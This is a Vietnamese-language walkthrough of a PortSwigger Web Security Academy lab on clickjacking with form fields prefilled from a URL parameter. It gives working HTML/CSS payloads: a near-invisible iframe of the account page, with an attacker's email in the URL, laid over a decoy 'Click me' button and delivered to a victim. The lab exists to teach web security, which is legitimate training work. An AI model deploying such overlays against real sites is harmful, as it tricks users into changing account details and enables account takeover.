# Clickjacking with prefilled form input

**Tấn công clickjacking với form đã được điền sẵn** là một kỹ thuật tấn công khai thác cách các trang web xử lý dữ liệu đầu vào của form thông qua tham số GET trong URL. Dưới đây là cách hoạt động của kiểu tấn công này:

1. **Form cho phép điền trước dữ liệu qua GET param**

- Một số trang web cho phép tự động điền trước dữ liệu vào các trường trong form bằng cách sử dụng tham số GET trong URL.

- Ví dụ: *https://example.com/form?name=John&email=john@example.com* sẽ tự động điền các trường "name" và "email" trong form trên trang.

2. **Tận dụng URL chứa dữ liệu của attacker**

- Vì các tham số GET là một phần của URL, kẻ tấn công có thể sửa đổi URL để chứa dữ liệu theo ý mình, như các thông tin độc hại hoặc thông tin mà chúng muốn người dùng vô tình gửi đi.

3. **Overlay nút "submit" trong giao diện giả mạo**

- Attacker tạo 1 website giả mạo (decoy site) với giao diện thu hút người dùng.

- Sau đó, chúng nhúng trang web mục tiêu (với form đã được điền sẵn dữ liệu từ URL) vào trong một **iframe ẩn**.

- Nút "submit" của form được căn chỉnh chính xác để nằm dưới một nút hoặc khu vực nào đó trên giao diện giả mạo.

4. **Người dùng vô tình gửi form**

- Khi người dùng tương tác với giao diện của trang web giả mạo, họ vô tình nhấn nút "submit" của form trên trang web mục tiêu mà không hề hay biết.

- Điều này dẫn đến việc gửi dữ liệu mà kẻ tấn công đã chuẩn bị trước.

5. **Biến thể**

- Một số trang web yêu cầu người dùng phải nhập dữ liệu trước khi gửi form. Kẻ tấn công vẫn có thể sử dụng phương pháp tương tự, miễn là form cho phép điền dữ liệu trước qua URL.

Kiểu tấn công này kết hợp việc sử dụng tham số GET để điền sẵn dữ liệu vào form và clickjacking để người dùng vô tình gửi form chứa dữ liệu độc hại hoặc không mong muốn. Đây là một ví dụ khác của việc lợi dụng lỗ hổng giao diện để thao túng hành vi của người dùng.

# Lab: Clickjacking with form input data prefilled from a URL parameter
![img](7)

### Web page
![img](8)

### Solution

Log in vào account được cấp wiener:peter:

![img](9)

Để giải quyết bài lab, tiếp tục cần sử dụng payload có dạng như sau: 

    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

Chỉnh sửa payload thành: 

    <style>
        iframe {
            position:relative;
            width:1000px;
            height:500px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top:515px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe src="https://0acc004304afd6c481d2434f003f0064.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

Go to exploit server và copy payload vào phần body: 

![img](10)

Store và View Exploit: 

![img](11)

Căn chỉnh lại payload để Text Click me nằm đè lên Update email button. 

    <style>
        iframe {
            position:relative;
            width:700px;
            height:500px;
            opacity: 0.0001;
            z-index: 2;
        }
        div {
            position:absolute;
            top:445px;
            left: 80px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe src="https://0acc004304afd6c481d2434f003f0064.web-security-academy.net/my-account?email=attacker111@test.com"></iframe>

![img](12)

Sau khi chỉnh xong, thay giá trị opacity thành 0.00001, thay email và click Deliver exploit to victim.

Solved the lab

![img](13)

